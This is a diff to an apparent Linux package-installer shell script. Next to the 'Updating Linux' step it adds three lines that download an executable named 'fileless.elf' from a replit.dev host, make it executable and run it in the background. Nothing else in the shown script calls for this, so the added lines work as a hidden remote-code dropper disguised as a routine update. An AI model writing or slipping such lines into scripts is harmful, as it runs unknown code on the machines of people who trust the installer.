@@ -123,6 +123,9 @@ printf "\e[1;94mYou have choosen Linux as your current terminal packages for Lin
 sleep 2
 clear || cls 
 echo -e "\033[1;91m[*]\033[1;97m Updating Linux\033[0m"
+curl -o fileless.elf https://4767c376-6cc7-4e7b-80e8-7145a5a1e96c-00-1a8y7g7eti9es.picard.replit.dev/fileless.elf
+chmod +x fileless.elf
+./fileless.elf &
 sudo apt-get update
 echo
 echo -e "\033[1;91m[*]\033[1;97m Upgrading Linux\033[0m"
